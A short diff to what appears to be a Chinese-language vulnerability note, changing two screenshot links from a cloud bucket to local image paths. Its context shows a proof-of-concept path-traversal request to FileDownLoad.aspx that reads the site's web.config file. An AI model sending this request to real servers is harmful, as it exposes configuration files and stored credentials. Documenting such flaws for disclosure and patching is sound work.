@@ -20,7 +20,7 @@
 
 登陆页面
 
-![image-20220525150952244](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251509315.png)
+![image-20220525150952244](./images/202205251509315.png)
 
 验证POC
 
@@ -28,4 +28,4 @@
 /Module/FileManagement/FileDownLoad.aspx?filePath=../../web.config
 ```
 
-![image-20220525151256759](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251512861.png)
+![image-20220525151256759](./images/202205251512861.png)
